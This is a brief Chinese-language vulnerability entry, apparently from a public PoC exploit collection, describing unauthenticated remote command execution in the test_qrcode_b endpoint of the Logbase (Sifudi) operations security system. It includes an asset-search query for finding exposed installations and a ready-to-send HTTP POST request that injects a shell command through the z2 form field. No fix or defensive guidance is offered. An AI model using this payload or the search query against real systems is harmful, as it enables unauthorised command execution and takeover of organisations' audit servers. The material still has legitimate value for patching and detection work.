# 思福迪运维安全管理系统 test_qrcode_b存在远程命令执行漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">为满足用户对加强内部运维安全审计日益迫切的需要，杭州思福迪信息技术有限公司依托自身强大的研发能力，丰富的行业经验，自主研发了新一代软硬件一体化运维安全专用审计系统——Logbase运维安全管理系统。该系统支持对企业内部人员的维护行为进行全面的管理、审计，消除了传统审计系统中的盲点，使企业对运维人员的操作过程，能做到事前防范、事中控制、事后审计的能力，是企业IT内控最有效的运维管理平台。思福迪运维安全管理系统 test_qrcode_b存在远程命令执行漏洞，未经身份认证得攻击者可以通过此漏洞执行任意指令，造成服务器失陷。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 思福迪运维安全管理系统

# 三、资产测绘
+ hunter`app.name="Logbase 思福迪 运维安全系统"`
+ 特征


# 四、漏洞复现
`referer`头不能删除

```plain
POST /bhost/test_qrcode_b HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 23
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: 

z1=1&z2="|id;"&z3=bhost
```

![]()


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cwhyqkk2t3hh660w>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
